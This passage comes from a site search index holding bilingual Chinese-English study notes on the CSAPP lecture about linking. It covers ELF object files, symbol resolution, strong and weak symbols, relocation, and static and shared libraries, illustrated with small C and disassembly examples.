memory.</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L13-Linking/","title":"L13 Linking","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=13</p> <p>Today</p> <p>\u200b   \u94fe\u63a5 -Linking</p> <p>\u200b   \u6848\u4f8b\u7814\u7a76\uff1a\u5e93\u6253\u6869\u6280\u672f Case study: Library interpositioning</p> <p>\u6ce8\uff1a\u5e93\u6253\u6869\u6280\u672f\u5141\u8bb8\u4f60\u4f7f\u7528\u94fe\u63a5\u5b9e\u9645\u62e6\u622a\u6bd4\u5982 C \u6807\u51c6\u5e93\u8fd9\u6837\u7684\u5e93\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u3002</p> <p>C \u7a0b\u5e8f\u4f8b\u5b50 Example C Program</p> <pre><code>// main.c\nint sum(int *a, int n);\n\nint array[2] = {1, 2};\n\nint main() {\n    int val = sum(array, 2);\n    return val;\n}\n</code></pre> <pre><code>// sum.c\nint sum(int *a, int n) {\n    int i, s = 0;\n    for (i = 0; i &lt; n; i++) {\n        s += a[i];\n    }\n    return s;\n}  \n</code></pre> <p>\u9759\u6001\u94fe\u63a5 Static Linking</p> <p>\u200b   Programs are translated and linked using a compiler driver:</p> <pre><code>linux&gt; gcc -Og -o prog main.c sum.c\nlinux&gt; ./prog\n</code></pre> <pre><code>  main.c                    sum.c\n    |Translators(cpp, cc1, as)|\n    v                         v\n  main.o                    sum.o\n    |                         |\n    v                         v\n    ---------Linker(ld)--------\n                |\n                v\n              prog\n</code></pre> <p>\u7ffb\u8bd1\u5668\u9996\u5148\u5305\u62ec C \u9884\u5904\u7406\u5668 cpp\uff08\u5c06 <code>main.c</code> \u7ffb\u8bd1\u6210 ASCII \u4e2d\u95f4\u6587\u4ef6 <code>main.i</code>\uff09</p> <p>\u7136\u540e\u5305\u62ec\u7f16\u8bd1\u5668\uff0c\u5b9e\u9645\u4e0a\u4f7f\u7528\u7684\u662f cc1\uff08\u5c06 <code>main.i</code> \u7ffb\u8bd1\u6210 ASCII \u6c47\u7f16\u8bed\u8a00\u6587\u4ef6 <code>main.s</code>\uff09</p> <p>\u7136\u540e\u5305\u62ec\u6c47\u7f16\u5668 as \u751f\u6210 <code>.o</code> \u6587\u4ef6\u3002</p> <p>\u6240\u4ee5 <code>.c</code> \u6587\u4ef6\u79f0\u4e3a\u6e90\u6587\u4ef6\uff08source file\uff09\uff0c<code>.o</code> \u6587\u4ef6\u79f0\u4e3a\u76ee\u6807\u6587\u4ef6\uff08object files\uff09\uff08separately compiled relocatable object files\uff09\uff0cFully linked executed object file (contains code and data for all function defined in <code>main.c</code> and <code>sum.c</code>).</p> <p>\u4e3a\u4ec0\u4e48\u8981\u94fe\u63a5\u5668\uff08\u4e3a\u4ec0\u4e48\u8981\u5206\u79bb\u7f16\u8bd1\uff09 Why Linkers?</p> <p>\u200b   \u539f\u56e0\u4e00\uff1a\u6a21\u5757\u5316 Reason 1: Modularity</p> <p>\u200b       \u7a0b\u5e8f\u5e94\u8be5\u5199\u6210\u5c0f\u4efd\u6e90\u4ee3\u7801\u800c\u4e0d\u662f\u4e00\u4e2a\u5927\u6587\u4ef6 Program can be written as a collection of smaller source files, rather than one monolithic mass.</p> <p>\u200b       Can build libraries of common functions (more on this later)</p> <p>\u200b           e.g. math library, standard C library.</p> <p>\u200b   \u539f\u56e0\u4e8c\uff1a\u9ad8\u6548 Reason 2: Efficiency</p> <p>\u200b       \u65f6\u95f4\u4e0a\uff1a\u5206\u5f00\u7f16\u8bd1 Time: Separate compilatioin</p> <p>\u200b           Change one source file, compile and then relink.</p> <p>\u200b           No need to recompile other source file.</p> <p>\u200b       \u7a7a\u95f4\u4e0a\uff1a\u5e93 Space: Libraries</p> <p>\u200b           Common functions can be aggregated into a single file...</p> <p>\u200b           Yet executable files and running memory images contain only code for the functions they actually use.</p> <p>\u94fe\u63a5\u5668\u505a\u4ec0\u4e48\uff1f What Do Linkers Do?</p> <p>\u200b   \u7b2c\u4e00\u6b65\uff1a\u7b26\u53f7\u89e3\u6790 Step 1: Symbol resolution</p> <p>\u200b       Programs define and reference symbols (global variables and functions):</p> <p>\u200b           <code>void swap() {...} /* define symbol swap */</code></p> <p>\u200b           <code>swap(); /* reference symbol swap */</code></p> <p>\u200b           <code>int *xp = &amp;x; /*define symbol xp, reference x */</code></p> <p>\u200b       \u7b26\u53f7\u5b9a\u4e49\uff08\u88ab\u6c47\u7f16\u5668\uff09\u5b58\u50a8\u5728\u4e00\u4e2a\u5bf9\u8c61\u8868\u4e2d\uff0c\u79f0\u4f5c\u5bf9\u8c61\u8868 Symbol definitionis are stored in object file (by assembler) in symbol table</p> <p>\u200b           \u5bf9\u8c61\u8868\u662f\u4e00\u7cfb\u5217\u7ed3\u6784\u4f53\u6570\u7ec4 Symbol table is an array of <code>structs</code>.</p> <p>\u200b           \u6bcf\u4e2a\u7ed3\u6784\u4f53\u90fd\u5305\u542b\u4e86\u7b26\u53f7\u7684\u540d\u79f0\u3001\u5927\u5c0f\u3001\u4f4d\u7f6e\u7b49\u4fe1\u606f Each entry includes name, size, and location of symbol.</p> <p>\u200b       During symbol resolution step, the linker association each symbol with exactly definition.</p> <p>\u6b64\u5904\u7684\u5f15\u7528\uff08reference\uff09\u9700\u4e0e C \u4e2d\u7684\u5f15\u7528\u533a\u522b\uff0c\u6b64\u5904\u300c\u5f15\u7528\u300d\u6307\u8bbf\u95ee\u67d0\u4e2a\u5bf9\u8c61\u7684\u884c\u4e3a\u3002\u94fe\u63a5\u5668\u5fc5\u987b\u51b3\u5b9a\u5c06\u5176\u4e2d\u7684\u67d0\u4e2a\u5b9a\u4e49\u7528\u4e8e\u6240\u6709\u540e\u7eed\u5f15\u7528\u3002</p> <p>\u200b   \u7b2c\u4e8c\u90e8\uff1a\u91cd\u5b9a\u4f4d Step 2: Relocation</p> <p>\u200b       \u5c06\u6240\u6709\u6a21\u5757\u5408\u5e76\u5230\u4e00\u8d77 Merges separate code and data sections into single sections.</p> <p>\u200b       \u5c06\u7b26\u53f7\u4ece <code>.o</code> \u6587\u4ef6\u4e2d\u7684\u76f8\u5bf9\u4f4d\u7f6e\u91cd\u5b9a\u4f4d\u5230\u5408\u5e76\u5230\u4e00\u8d77\u7684\u6587\u4ef6\u4e2d\u7684\u7edd\u5bf9\u4f4d\u7f6e Relocates symbols from their relative locations in the <code>.o</code> files to their final absolute memory locations in the executable.</p> <p>\u200b       \uff08\u5728\u91cd\u5b9a\u5411\u524d\u76ee\u6807\u6a21\u5757\u4e2d\u7684\u51fd\u6570\u5730\u5740\u53ea\u662f\u5b83\u5728\u6a21\u5757\u4e2d\u7684\u504f\u79fb\u91cf\uff0c\u5bf9\u4e8e\u6570\u636e\u4e5f\u662f\u5982\u6b64\uff09</p> <p>\u200b       \u66f4\u65b0\u6240\u6709\u5bf9\u7b26\u53f7\u7684\u5f15\u7528\u4ee5\u4f7f\u5176\u6307\u5411\u6b63\u786e\u7684\u5730\u5740 Updates all references to these symbols to reflect their new positions.</p> <p>Let's look at these two steps in more detail...</p> <p>Three Kinds of Object Files(Modules)</p> <p>\u200b   \u91cd\u5b9a\u5411\u76ee\u6807\u6587\u4ef6 Relocatable object file (<code>.o</code> file)</p> <p>\u200b       Contains code and data in a form that can be combined with other relocatable object files to form executable object file.</p> <p>\u200b       Each <code>.o</code> file is produced from exactly on source (<code>.c</code> code)</p> <p>\u200b       \uff08<code>.o</code> \u6587\u4ef6\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5\u52a0\u8f7d\uff09</p> <p>\u200b   \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6 Executable object file (<code>a.out</code> file)</p> <p>\u200b       Contains code and data in a form that can be copied directly into memory and then executed.</p> <p>\u200b   \u5171\u4eab\u76ee\u6807\u6587\u4ef6 Shared object file (<code>.so</code> file)</p> <p>\u200b       \u662f\u4e00\u79cd\u7279\u6b8a\u7684\u91cd\u5b9a\u5411\u76ee\u6807\u6587\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5728\u52a0\u8f7d\u65f6\u6216\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\u5e76\u94fe\u63a5\u81f3\u5185\u5b58\u3002Special type of relocatable object file that can be loaded into memory and linked dynamically, at either load time or run-time.</p> <p>\u200b       Called Dynamic Link Libraries (DLLs) by Windows.</p> <p>\u200b       \uff08\u8fd9\u662f\u4e00\u79cd\u7528\u4e8e\u521b\u5efa\u5171\u4eab\u5e93\u7684\u73b0\u4ee3\u6280\u672f\uff09</p> <p>\u73b0\u5728\uff0c\u76ee\u6807\u6a21\u5757\u91c7\u7528\u79f0\u4e3a ELF \u683c\u5f0f\u7684\u6807\u51c6\u683c\u5f0f\u3002</p> <p>Executable and Linkable Format (ELF)</p> <p>\u200b   Standard binary format for object files</p> <p>\u200b   One unified format for</p> <p>\u200b       Relocatable object files (<code>.o</code>)</p> <p>\u200b       Executable object files (<code>a.out</code>)</p> <p>\u200b       Shared object files (<code>.so</code>)</p> <p>\u200b   Generic name: ELF binaries.</p> <p>ELF Object File Format</p> <pre><code>ELF header &lt;- 0\nSegment header table (required for executables)\n.text section\n.rodata section\n.data section\n.bss section\n.symtab section\n.rel.text section\n.rel.data section\n.debug section\nSection header\n</code></pre> <p>ELF \u5934 ELF header</p> <p>\u200b   Word size, byte ordering, file type (<code>.o</code>, exec, <code>.so</code>), machine type, etc.</p> <p>\u200b   \u5b9a\u4e49\u4e86\uff08\u58f0\u79f0\u8be5\u6587\u4ef6\u7cfb\u7edf\u7684\uff09\u5b57\u8282\u987a\u5e8f\u548c\u5b57\u7684\u5927\u5c0f\u3002</p> <p>\u6bb5\u5934\u90e8\u8868 Segment header table </p> <p>\u200b   \u53ea\u5728\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e2d\u5b9a\u4e49\u3002\u6307\u51fa\u4ee3\u7801\u7684\u6240\u6709\u4e0d\u540c\u6bb5\u5728\u5185\u5b58\u4e2d\u7684\u4f4d\u7f6e\u3002</p> <p>\u200b   Page size, virtual addresses memory segments (sections), segment sizes</p> <p><code>.text</code> section</p> <p>\u200b   Code</p> <p>\u200b   \u7531\u4e8e\u67d0\u79cd\u795e\u79d8\u7684\u5386\u53f2\u539f\u56e0\uff0c\u5f88\u591a\u4ee3\u7801\u90e8\u5206\u90fd\u5199\u4f5c\u300ctext\u300d\uff0c\u53ea\u8bfb\u3002</p> <p><code>.rodata</code> section</p> <p>\u200b   \u53ea\u8bfb\u6570\u636e\uff0c\u5982\uff1a\u8df3\u8f6c\u8868 Read only data: jump tables, ...</p> <p><code>.data</code> section</p> <p>\u200b   \uff08\u5b9a\u4e49\uff09\u5df2\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u3002Initialized global variables.</p> <p><code>.bss</code> section</p> <p>\u200b   \uff08\u5b9a\u4e49\uff09\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u3002Uninitialized global variables</p> <p>\u200b   <code>bss</code> \u7684\u547d\u540d\u6765\u6e90\u4e8e IBM \u6307\u4ee4\u5c06\u5176\u79f0\u4e3a\u5757\u7b26\u53f7\uff08block started by symbol\uff09\"Block Started by Symbol\"</p> <p>\u200b   \u6559\u6388\u8ba4\u4e3a\u66f4\u597d\u7684\u7406\u89e3\u65b9\u5f0f\u662f\u300cbetter save space\u300d\u3002\"Better Save Space\"</p> <p>\u200b   \uff08\u521d\u59cb\u5316\u524d\uff09\u6709\u4e00\u4e2a\u6bb5\u7528\u4e8e\u672a\u521d\u59cb\u5316\u53d8\u91cf\uff0c\u800c\u5b83\u4eec\u6ca1\u6709\u5360\u7528 <code>.o</code> \u6587\u4ef6\u4e2d\u7684\u4efb\u4f55\u7a7a\u95f4\u3002Has section header but occupies no space</p> <p><code>.symtab</code> section</p> <p>\u200b   Symbol table</p> <p>\u200b   Procedure and static variable names</p> <p>\u200b   Section names and locations</p> <p><code>.rel.text</code> section</p> <p>\u200b   Relocation info for <code>.text</code> section</p> <p>\u200b   Addresses of instructions that will need to be modified in the executable.</p> <p>\u200b   Instructions for modifying.</p> <p><code>.rel.data</code> section</p> <p>\u200b   Relocation info for <code>.data</code> section.</p> <p>\u200b   Addresses of pointer data that will need to be modified in the merged executable.</p> <p><code>.debug</code> section</p> <p>\u200b   Info for symbolic debugging (<code>gcc -g</code>).</p> <p>Section header table</p> <p>\u200b   Offsets and sizes of each section.</p> <p>Linker Symbols</p> <p>\u200b   \u5168\u5c40\u7b26\u53f7 Global symbols</p> <p>\u200b       \u5168\u5c40\u7b26\u53f7\u5728\u6a21\u5757 m \u4e2d\u5b9a\u4e49\uff0c\u5e76\u88ab\u5176\u4ed6\u6a21\u5757\u4f7f\u7528\u3002Symbols defined by module m that can be referenced by other modules.</p> <p>\u200b       e.g.: non-<code>static</code> C functions and non-<code>static</code> global variables.</p> <p>\u200b   \u5916\u90e8\u7b26\u53f7 External symbols</p> <p>\u200b       \u5916\u90e8\u7b26\u53f7\u662f\u88ab\u5176\u4ed6\u6a21\u5757\u4f7f\u7528\uff0c\u4f46\u7531\u5176\u4ed6\u6a21\u5757\u5b9a\u4e49\u7684\u5168\u5c40\u7b26\u53f7\u3002Global symbols that are referenced by module m but defined by some other module.</p> <p>\u200b   \u5c40\u90e8\u8bb0\u53f7 Local symbols </p> <p>\u200b       \u5728\u6a21\u5757 m \u4e2d\u5b9a\u4e49\u548c\u5f15\u7528\u7684\u7b26\u53f7\u3002Symbols that are defined and referenced exclusively by module m.</p> <p>\u200b       \u4f8b\u5982\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\u6216\u4f7f\u7528 <code>static</code> \u5c5e\u6027\u58f0\u660e\u7684\u51fd\u6570\u3002e.g.: C function and global variables defined with the <code>static</code> attribute.</p> <p>\u200b       Local linker symbols are not local program variables.</p> <p></p> <p>Local Symbols</p> <p>\u200b   Local non-<code>static</code> C variables vs. local <code>static</code> C variables</p> <p>\u200b       local non-static C variables: stored on the stack.</p> <p>\u200b       local static C variables: stored in either <code>.bss</code>, or <code>.data</code></p> <p>\u200b   Compiler allocates space in <code>.data</code> for each definition of <code>x</code>. Creates local symbols in the symbol table with unique names, e.g. <code>x.1</code> and <code>x.2</code></p> <pre><code>int f() {\n    static int x = 0;\n    return x;\n}\nint g() {\n    static int x = 1;\n    return x;\n}\n</code></pre> <p>How Linker Resolves Duplicate Symbol Definitions</p> <p>\u200b   Program symbols are either strong or weak.</p> <p>\u200b       Strong: procedures and initialized globals.</p> <p>\u200b       Weak: uninitialized globals.</p> <pre><code>// p1.c\nint foo = 5; // strong foo\n\np1() { // strong p1()\n}\n</code></pre> <pre><code>// p2.c\nint foo; // weak foo\np2() { // strong p2()\n}\n</code></pre> <p>Linker's Symbol Rules</p> <p>\u200b   Rule 1: Multiple strong symbols are not allowed.</p> <p>\u200b       Each item can be defined only once.</p> <p>\u200b       Otherwise: Linker error.</p> <p>\u200b   \uff08\u5982\u679c\u6211\u4eec\u5728\u591a\u4e2a\u6a21\u5757\u4e2d\u58f0\u660e\u4e00\u4e2a\u5177\u6709\u76f8\u540c\u540d\u79f0\u7684\u51fd\u6570\uff0c\u5219\u94fe\u63a5\u5668\u62a5\u9519\u3002\uff09</p> <p>\u200b   Rule 2: Given a strong symbol and multiple weak symbols, choose the strong symbol</p> <p>\u200b       References to the weak symbol resolves to the strong symbol.</p> <p>\u200b   \uff08\u5728\u540c\u540d\u65f6\uff0c\u5982\u679c\u6709\u591a\u79cd\u91cd\u5b9a\u5411\u9009\u62e9\uff0c\u5e76\u5b58\u5728\u5f3a\u7b26\u53f7\u7684\u9009\u62e9\uff0c\u5219\u94fe\u63a5\u5668\u9009\u62e9\u5f3a\u7b26\u53f7\u3002\uff09</p> <p>\u200b   Rule 3: If there are multiple weak symbols pick an arbitrary one.</p> <p>\u200b       Can override this with <code>gcc -fno-common</code></p> <p>\u200b   \uff08\u5728\u540c\u540d\u65f6\uff0c\u5982\u679c\u6709\u591a\u79cd\u91cd\u5b9a\u5411\u9009\u62e9\uff0c\u4e14\u4e0d\u5b58\u5728\u5f3a\u7b26\u53f7\u7684\u9009\u62e9\uff0c\u5219\u94fe\u63a5\u5668\u968f\u610f\u9009\u62e9\u4e00\u4e2a\u3002\uff09</p> <p>\u200b   \uff08\u4f7f\u7528\u7ed9\u51fa\u7684\u8fd9\u4e2a\u7f16\u8bd1\u9009\u9879\uff0c\u5219\u4f1a\u5728\u8fdb\u5165\u8fd9\u79cd\u60c5\u51b5\u65f6\u62a5\u9519\u3002\uff09</p> <p>\uff08\u94fe\u63a5\u5668\u62a5\u9519\u662f\u76f8\u5f53\u7cdf\u7cd5\u7684\u4e00\u79cd\u62a5\u9519\uff0c\u56e0\u4e3a\u96be\u4ee5\u67e5\u660e\u9519\u8bef\u3002\uff09</p> <p>Linker Puzzles</p> <pre><code>// Module 1\nint x;\np1() {}\n// module 2\np1() {}\n/* \u8fdd\u53cd\u89c4\u5219 1 */\n</code></pre> <pre><code>// Module 1\nint x;\np1() {}\n// module 2\nint x;\np2() {}\n/* \u4e24\u4e2a x \u5730\u4f4d\u7b49\u540c\uff0c\u6309\u7167\u89c4\u5219 3 \u5904\u7406\uff0c\u4f46\u8fd9\u662f\u4f60\u60f3\u8981\u7684\u7ed3\u679c\u5417\uff1f */\n</code></pre> <pre><code>// Module 1\nint x;\nint y;\np1() {}\n// module 2\ndouble x;\np2() {}\n/* Writes to x in p2 might overwrite y! */\n/* \u5982\u679c x \u91cd\u5b9a\u5411\u7684\u662f module 2 \u4e2d\u7684 x\uff0c\u90a3\u4e48\u56e0\u4e3a\u5176 8 \u4e2a\u5b57\u8282\uff0c\u8f7d\u5165\u5230 4 \u4e2a\u5b57\u8282\u65f6\u4f1a\u8986\u5199\u6389 y\uff0c\u76f8\u5f53\u90aa\u6076\uff08evil\uff09\u3002 */ \n/* \u8fd9\u4e2a\u4f8b\u5b50\u5728 gcc9 \u7f16\u8bd1\u65f6\u5df2\u4f18\u5316\u4e3a\u4f1a\u62a5 conflicting types \u7684\u9519\u8bef\uff0c\u800c\u975e\u9519\u8bef\u6267\u884c\u4e0b\u53bb\u3002  */\n</code></pre> <pre><code>// Module 1\nint x = 7;\nint y = 5;\np1() {}\n// module 2\ndouble x;\np2() {}\n/* \u8fd9\u4e2a\u4f8b\u5b50\u867d\u7136\u662f double \u88ab int \u7684 x \u8f7d\u5165\uff0c\u4f46\u57fa\u672c\u4e0a\u8fd8\u662f\u4f1a\u5bfc\u81f4 y \u88ab\u8986\u5199 */\n/* \u8fd9\u662f\u56e0\u4e3a\u5bf9 module 2 \u7f16\u8bd1\u65f6\uff0c\u5bf9 x \u7684\u6307\u4ee4\u76f8\u5173\u4f7f\u7528\u7684\u662f 8 \u4e2a\u5b57\u8282\u5927\u5c0f\u7684\u6307\u4ee4 */\n/* \u91cd\u5b9a\u5411\u540e\uff0cmodule 2 \u4e2d\u548c x \u76f8\u5173\u7684\u6307\u4ee4\u7684\u64cd\u4f5c\u88ab\u91cd\u5b9a\u5411\u5230 x\uff0c\u6700\u7ec8\u5bfc\u81f4\u4e86\uff1a */\n/* \u5bf9 4 \u5b57\u8282\u53d8\u91cf int \u7684 x \u505a 8 \u5b57\u8282\u7684\u64cd\u4f5c\uff0c\u5bf9\u4e8e\u5199\u5165\u76f8\u5173\u7684\u6307\u4ee4\uff0cy \u5fc5\u7136\u88ab\u8986\u5199 */\n</code></pre> <pre><code>// Module 1\nint x = 7;\np1() {}\n// module 2\nint x;\np2() {}\n/* \u540c\u4e0a\u4f8b\uff0cp2 \u4e0e x \u76f8\u5173\u7684\u6307\u4ee4\u5b9e\u9645\u6267\u884c\u5728 module 1 \u4e2d\u7684 x \u4e0a\uff0c\u521d\u59cb\u503c 7 \u53ef\u80fd\u4f1a\u9020\u6210\u5f71\u54cd */\n</code></pre> <p>Nightmare scenario: two identical weak structs, compiled by different compiler with different alignment rule.</p> <p>Global Variables</p> <p>\u200b   Avoid if you can</p> <p>\u200b   Otherwise:</p> <p>\u200b       Use <code>static</code> if you can.</p> <p>\u200b       Initialize if you define a global variable.</p> <p>\u200b       Use <code>extern</code> if you reference an external global variable.</p> <p>Step 2: Relocation</p> <p></p> <p>Relocation Entries</p> <pre><code>// main.c\nint array[2] = {1, 2};\n\nint main() {\n    int val = sum(array, 2);\n    return val;\n}\n</code></pre> <pre><code>0000000000000000 &lt;main&gt;:         \n   0:   48 83 ec 08             sub    $0x8,%rsp\n   4:   be 02 00 00 00          mov    $0x2,%esi\n   9:   bf 00 00 00 00          mov    $0x0,%edi      # %edi = &amp;array\n                        a: R_X86_64_32 array          # Relocation entry\n\n   e:   e8 00 00 00 00          callq  13 &lt;main+0x13&gt; # sum()\n                        f: R_X86_64_PC32 sum-0x4      # Relocation entry\n  13:   48 83 c4 08             add    $0x8, %rsp\n  17:   c3                      retq\n</code></pre> <p>\u7f16\u8bd1\u5668\u5728\u9047\u5230\u94fe\u63a5\u91cd\u5b9a\u5411\u95ee\u9898\u65f6\uff0c\u4f1a\u597d\u5fc3\u5730\u63d0\u9192\u6b64\u5904\u5b58\u5728\u91cd\u5b9a\u5411\u9009\u62e9\uff0c\u8fd9\u4e2a\u63d0\u9192\u53eb\u505a\u91cd\u5b9a\u4f4d\u6761\u76ee\uff08relocation entry\uff09\uff0c\u8fd9\u4e9b\u5c06\u4f1a\u5b58\u50a8\u5728\u76ee\u6807\u6587\u4ef6\u7684\u91cd\u5b9a\u4f4d\u6bb5\u4e2d\u3002</p> <p>\u4f60\u53ef\u4ee5\u770b\u5230\u91cd\u5b9a\u5411\u9009\u62e9\u7684\u90e8\u5206\u88ab\u5168\u6539\u4e3a <code>0</code>\uff0c\u6bd4\u5982\u8fd9\u91cc\u7684 <code>9: bf 00 00 00 00</code>\uff0c\u9664\u4e86 <code>bf</code> \u4ee3\u8868\u8fd9\u662f\u4e00\u6761 <code>mov</code> \u6307\u4ee4\uff0c\u540e\u9762\u7684\u5730\u5740\u5168\u90e8\u4e3a <code>0</code> \u6682\u7f3a\uff0c\u5728\u6700\u7ec8\u7684\u76ee\u6807\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\u6587\u4ef6\uff09\u4e2d\uff0c\u8fd9\u4e9b <code>0</code> \u5c06\u4f1a\u4fee\u6539\u4e3a\u6b63\u786e\u7684\u64cd\u4f5c\u6570\u3002</p> <p>\u540e\u9762\u7684 <code>e: e8 00 00 00 00</code> \u7c7b\u4f3c\uff0c\u4f46\u6c47\u7f16\u90e8\u5206\u7ed9\u51fa\u4e86\u4e00\u4e2a\u76f8\u5bf9\u4f4d\u7f6e\uff1a<code>&lt;main+0x13&gt;</code>\uff0c\u8fd9\u662f\u7ed9\u94fe\u63a5\u5668\u7528\u7684\uff0c\u5e76\u7b49\u5f85\u94fe\u63a5\u5668\u5c06\u8be5\u76f8\u5bf9\u4f4d\u7f6e\u4fee\u6539\u4e3a\u7edd\u5bf9\u4f4d\u7f6e\u3002</p> <pre><code>00000000004004d0 &lt;main&gt;:         \n  4004d0:       48 83 ec 08       sub    $0x8,%rsp\n  4004d4:       be 02 00 00 00    mov    $0x2,%esi\n  4004d9:       bf 18 40 60 00    mov    $0x601018,%edi  # %edi = &amp;array        \n  4004de:       e8 05 00 00 00    callq  4004e8 &lt;sum&gt;    # sum() \n  4004e3:       48 83 c4 08       add    $0x8, %rsp\n  4004e7:       c3                retq \n\n00000000004004e8 &lt;sum&gt;:\n  4004e8:       b8 00 00 00 00          mov    $0x0,%eax\n  4004ed:       ba 00 00 00 00          mov    $0x0,%edx\n  4004f2:       eb 09                   jmp    4004fd &lt;sum+0x15&gt;\n  4004f4:       48 63 ca                movslq %edx,%rcx\n  4004f7:       03 04 8f                add    (%rdi,%rcx,4),%eax\n  4004fa:       83 c2 01                add    $0x1,%edx\n  4004fd:       39 f2                   cmp    %esi,%edx\n  4004ff:       7c f3                   jl     4004f4, &lt;sum+0x&gt;\n  400501:       f3 c3                   repz retq\n</code></pre> <p>Using PC-relative addressing for <code>sum()</code>: 0x400e8 = 0x4004e3 + 0x05\uff08\u89c1 <code>4004de</code> \u884c\uff09</p> <p>\u6b64\u5904 array \u6570\u7ec4\u7684\u5730\u5740\u5df2\u5728\u8fd0\u884c\u65f6\u8865\u5168\u4e3a\uff1a<code>4004de: e8 05 00 00 00</code>.</p> <p></p> <p>\u8fd9\u5f20\u56fe\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u9762\u5411\u6c47\u7f16\u7a0b\u5e8f\u5458\uff08\u7f16\u8bd1\u5668\u3001\u94fe\u63a5\u5668\uff09\u7684\u5185\u5b58\u62bd\u8c61\uff0c\u5b9e\u9645\u5185\u5b58\uff08\u7269\u7406\u5185\u5b58\uff09\u5e76\u4e0d\u662f\u5982\u8fd9\u5f20\u56fe\u6240\u793a\uff0c\u8fd9\u662f\u56e0\u4e3a\u300c\u865a\u62df\u5185\u5b58\u300d\u7684\u5b58\u5728\u3002</p> <p>\u5806\u9876\u7531\u5168\u5c40\u53d8\u91cf <code>brk</code>\uff08\u53d6\u81ea break\uff09\u6307\u793a\uff0c\u7531\u5185\u6838\uff08kernel\uff09\u7ef4\u62a4\u3002</p> <p>\u6808\u9876\u7531\u901a\u7528\u5bc4\u5b58\u5668 <code>%rsp</code> \u7ef4\u62a4\u3002</p> <p>Packaging Commonly Used Functions</p> <p>\u200b   How to package functions commonly used by programmers?</p> <p>\u200b       Math, I/O, memory management, string manipulation, etc.</p> <p>\u200b   Awkward, given the linker framework so far:</p> <p>\u200b       Option 1: Put all functions into a single source file</p> <p>\u200b           Programmers link big object file into thir programs</p> <p>\u200b           Space and time inefficient</p> <p>\u200b       Option 2: Put each function in a separate source file.</p> <p>\u200b           Programmers explicitly link appropriate binaries into their programs</p> <p>\u200b           More efficient, but burdensome on the programmer.</p> <p>Old-fashioned Soluton: Static Libraries</p> <p>\u200b   Static libraries (<code>.a</code> archive files)</p> <p>\u200b       Concatenate related relocatable object files into a single file with an index (called an archive)</p> <p>\u200b       Enhance linker so that it tries to resolve unresolved external references by looking for the symbols in one or more archives.</p> <p>\u200b       If an archive member file resolves reference, link it into the executable.</p> <p>Creating Static Libraries</p> <pre><code>atoi,c    printf.c               random.c\n  |Translator|Translator...Translator|\n  v          V          ...          V\natoi.o    printf.o      ...      random.o\n  |          |                       |\n  V          v          ,..          v\n  ----------- Archiver (ar) ---------- \n                   |         // unix&gt; ar rs libc.a \\\n                   v         //   atoi.o printf.o ... random.o\n                libc.c // C standard library\n</code></pre> <p>\u200b   Archiver allows incremental updates.</p> <p>\u200b   Recompile function that changes and replace <code>.o</code> file in archive.</p> <p>Commonly Used Libraries</p> <p>\u200b   <code>libc.a</code> (the C standard library)</p> <p>\u200b       4.6 MB archive of 1496 object files.</p> <p>\u200b       I/O, memory allocation, signal handling, string handling, data and time, random numbers, integer math.</p> <p>\u200b   <code>libm.a</code> (the C math library)</p> <p>\u200b       2 MB archive of 444 object files.</p> <p>\u200b       floating point math (sin, cos, tan, log, exp, sqrt, ...)</p> <p>\u8fd9\u7c7b\u5e93\u7684\u60ef\u4f8b\u5c31\u662f\u4ee5 lib \u4e3a\u524d\u7f00\u3002</p> <pre><code>% ar -t libc,a | sort\n% ar -t libm.a | sort\n</code></pre> <p>Linking with Static Libraries</p> <pre><code>// main2.c\n#include &lt;stdio.h&gt;\n#include \"vector.h\"\n\nint x[2] = {1, 2};\nint y[2] = {3, 4};\nint z[2];\n\nint main() {\n    addvec(x, y, z, 2);\n    printf(\"z = [%d %d]\\n\". z[0], z[1]);\n    return 0;\n}\n// addvec.c\nvoid addvec(int *x, int *y, int *z, int n) {\n    int i;\n    for (i = 0; i &lt; n; i++)\n        z[i] = x[i] + y[i];\n}\n// multvec.c\nvoid multvec(int *x, int *y, int *z, int n) {\n    int i;\n    for (i = 0; i &lt; n; i++)\n        z[i] = x[i] * y[i];\n}\n</code></pre> <p>\u5176\u4e2d <code>addvec.c</code> \u548c <code>multvec.c</code> \u5747\u5305\u542b\u5728 <code>libvector.a</code> \u4e2d\u3002</p> <p></p> <p>Using Static Libraries</p> <p>\u200b   Linker's algorithm for resolveing external references:</p> <p>\u200b       Scan <code>.o</code> files and <code>.a</code> files in the command line order.</p> <p>\u200b       During the scan, keep a list of the current unresolved references.</p> <p>\u200b       As each new <code>.o</code> or <code>.a</code> file, obj, is encountered, try to resolve each unresolved reference in the list against the symbols defined in obj.</p> <p>\u200b       If any entries in the unresolved list at end of scan , then error.</p> <p>\u200b   Problem:</p> <p>\u200b       Command line order matters!</p> <p>\u200b       Moral: put libraries at the end of the command line.</p> <pre><code>unix&gt; gcc -L. libtest.o -lmine\nunix&gt; gcc -L. -lmine libtest.o\nlibtest.o: Infunction `main':\nlibtest.o(.text+0x4): undefined reference to `libfun'\n</code></pre> <p>Modern Solution: Shared Libraries</p> <p>\u200b   Static libraries have the following disadvantages:</p> <p>\u200b       \u526f\u672c\u8fc7\u591a Duplication in the stored executables (every function needs libc)</p> <p>\u200b       \u526f\u672c\u8fc7\u591a Duplication in the running executables.</p> <p>\u200b       \u4e00\u4fee\u5168\u4fee Minor bug fixes of system libraries require each application to explicitly relink.</p> <p>\u200b   Modern solution: Shared Libraries</p> <p>\u200b       Object files that contain code and data that are loaded and linked into an application dynamically, at either load-time or run-time.</p> <p>\u200b       Also called: dynamic link libraries, DLLs, <code>.so</code> files.</p> <p>\u200b   Dynamic linking can occur when executable is first loaded and run (load-time linking)</p> <p>\u200b       Common case for Linux, handled automatically by the dynamic linker (<code>ld-linux.so</code>)</p> <p>\u200b       Standard C library (<code>libc.so</code>) usually 